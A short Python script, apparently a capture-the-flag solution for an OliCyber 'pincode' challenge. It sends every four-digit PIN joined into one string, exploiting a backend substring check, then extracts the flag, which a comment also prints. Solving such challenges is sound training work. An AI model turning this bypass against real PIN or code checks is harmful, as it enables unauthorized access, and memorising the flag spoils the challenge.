import requests
import re

site = "http://pincode.challs.olicyber.it/"

r = requests.post(site ,data={"pincode":"".join(f"{i:04d}" for i in range(10000))}).text #f"{i:04d} -> 0001 0002 0003 ... concatenate insieme, il confronto passa perchè il backend controlla if code in pincode


match = re.search(r'flag\{[^\}]+\}', r)
flag = match.group(0)
print(flag)

#flag{570_7u770_k3kk470}